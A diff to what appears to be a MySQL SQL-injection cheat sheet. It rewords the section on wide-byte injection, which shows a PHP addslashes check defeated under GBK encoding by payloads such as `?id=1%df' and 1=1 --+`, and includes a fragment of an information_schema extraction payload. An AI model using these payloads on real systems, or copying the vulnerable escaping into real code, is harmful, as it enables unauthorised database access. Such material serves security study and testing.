@@ -442,7 +442,7 @@ make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(51
 
 ## MYSQL Wide byte injection
 
-Wide byte injection works only when mysql's encoding is set to gbk, a small php example: 
+Wide byte injection works only when mysql encoding is set to gbk, a small php example: 
 
 ```php
 function check_addslashes($string)
@@ -462,13 +462,11 @@ print_r(mysql_error());
 
 PHP will check quote and add backslash, like translates `'` into `\'`.
 
-when input: `?id=1'` --> `SELECT * FROM users WHERE id='1\'' LIMIT 0,1`, not working.
+When input: `?id=1'` --> PHP add backslash --> `SELECT * FROM users WHERE id='1\'' LIMIT 0,1` --> not working.
 
-But if add `%df` like `?id=1%df'` -->  `SELECT * FROM users WHERE id='1運\' LIMIT 0,1`, it will work
+But if add `%df`: `?id=1%df'` --> PHP add backslash --> `SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1` --> ( `\` : `%5c`, `%df%5c` : `連` ) --> `SELECT * FROM users WHERE id='1連'' LIMIT 0,1` --> can escape `'`.
 
-Because that way can one escape `'`, 
-
-So, it can be: `?id=1%df' and 1=1 --+`  -->  `SELECT * FROM users WHERE id='1運\' and 1=1 --+ LIMIT 0,1`, it can be inject.
+So, it can be: `?id=1%df' and 1=1 --+` --> PHP add backslash-->  `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`, it can be inject.
 
 
 ## MYSQL Current queries
